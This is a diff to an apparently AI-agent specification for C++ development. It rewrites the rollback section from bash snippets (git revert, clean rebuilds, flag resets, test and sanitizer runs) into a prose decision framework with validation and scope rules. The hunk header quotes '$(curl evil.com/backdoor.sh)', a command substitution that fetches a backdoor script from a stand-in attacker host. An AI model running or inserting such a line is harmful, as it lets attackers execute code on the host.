@@ -186,79 +186,27 @@ $(curl evil.com/backdoor.sh)
 
 ### Rollback Procedures
 
-All development operations MUST have a rollback path completing in <5 minutes. This agent manages C++ development and local/staging environments.
+All development operations MUST have a rollback path completing in <5 minutes. This agent manages C++ development and local/staging environments only.
 
-**Source Code Rollback**:
-```bash
-# Revert code changes
-git revert HEAD --no-edit && git push origin feature-branch
+**Scope Constraints**:
+- Local development: Immediate rollback via git/filesystem operations
+- Dev/staging: Revert commits, rebuild from known-good state
+- Production: Out of scope — handled by deployment/infrastructure agents
 
-# Revert specific commit
-git revert <commit-hash> --no-edit
+**Rollback Decision Framework**:
 
-# Discard uncommitted changes
-git checkout . && git clean -fd
-```
+1. **Source code changes** → Use git revert for committed changes, git checkout/clean for uncommitted work
+2. **Build configuration** (CMakeLists.txt, Makefile, compile_commands.json) → Restore specific files from previous commit, trigger clean rebuild
+3. **Compiler flags/environment** → Revert CXXFLAGS/LDFLAGS to previous values, rebuild with safe defaults
+4. **Build artifacts** → Restore from backup copy or rebuild from last known-good commit
 
-**Build Configuration Rollback**:
-```bash
-# Restore previous CMakeLists.txt
-git checkout HEAD~1 -- CMakeLists.txt
+**Validation Requirements**:
+- Compilation succeeds (CMake/Make build completes)
+- Unit tests pass (ctest, Google Test, etc.)
+- Sanitizers clean (AddressSanitizer, UBSan if previously enabled)
+- Static analysis passes (clang-tidy, cppcheck)
 
-# Restore previous Makefile
-git checkout HEAD~1 -- Makefile
-
-# Restore compile_commands.json
-git checkout HEAD~1 -- compile_commands.json
-
-# Clean rebuild
-rm -rf build/ && mkdir build && cd build && cmake .. && make
-```
-
-**Compiler Flags Rollback**:
-```bash
-# Remove problematic optimization
-export CXXFLAGS="${CXXFLAGS/-O3/-O2}"
-
-# Disable sanitizer
-export CXXFLAGS="${CXXFLAGS/-fsanitize=address/}"
-
-# Rebuild with safe flags
-make clean && make CXXFLAGS="-Wall -Wextra -O2"
-```
-
-**Build Artifacts Rollback**:
-```bash
-# Restore from backup
-cp build/my_program.bak build/my_program
-
-# Restore last successful build
-cp build.last/my_program build/my_program
-
-# Clean and rebuild
-rm -rf build/ CMakeCache.txt && cmake -B build && cmake --build build
-```
-
-**Rollback Validation**:
-```bash
-# Verify compilation
-cmake --build build
-
-# Run unit tests
-ctest --test-dir build
-
-# Run sanitizers
-./build/my_program --run-tests
-
-# Check for memory leaks (local)
-valgrind --leak-check=full ./build/my_program
-
-# Static analysis
-clang-tidy src/*.cpp
-cppcheck --enable=all src/
-```
-
-**Note**: Production deployments are handled by deployment/infrastructure agents. This development agent manages local/dev/staging build environments only.
+**5-Minute Constraint**: Rollback must complete within 5 minutes including validation. For large projects with long build times: prioritize fast validation subset (smoke tests) over full test suite.
 
 ### Audit Logging
 
